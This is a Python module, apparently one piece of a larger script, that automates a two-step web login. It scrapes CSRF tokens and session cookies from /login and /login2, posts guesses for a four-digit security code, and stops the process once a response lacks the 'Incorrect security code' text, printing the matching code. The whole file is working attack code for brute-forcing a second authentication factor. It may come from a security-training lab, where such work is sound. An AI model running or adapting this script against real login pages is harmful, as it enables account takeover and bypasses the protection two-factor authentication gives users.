from share import repatter
import os
from share import Share


def get_login(conn, headers):
    conn.request("GET", "/login", None, headers)

    r = conn.getresponse()

    matchOB = repatter.search(str(r.read()))
    csrf = matchOB.group().split()[1].split("=")[1].strip('"')

    cookie = r.getheader("Set-Cookie")
    cookie = cookie.split(";")
    cookie = cookie[0]
    return csrf, cookie

def post_login(conn, params, headers):
    conn.request("POST", "/login", params, headers)
    r = conn.getresponse()
    cookie = r.getheader("Set-Cookie").split(";")[0]
    return cookie


def get_login2(conn, headers):
    conn.request("GET", "/login2", None, headers)
    r = conn.getresponse()

    matchOB = repatter.search(str(r.read()))
    csrf = matchOB.group().split()[1].split("=")[1].strip('"')

    return csrf


def post_login2(conn, params, headers, k):
    conn.request("POST", "/login2", params, headers)
    r = conn.getresponse()
    text = str(r.read())
    #print(text)

    if "Incorrect security code" not in text and "Login" not in text:
        print('{:04d}'.format(k))
        pid = os.getpid()
        os.kill(pid, 2)
    Share.progress()
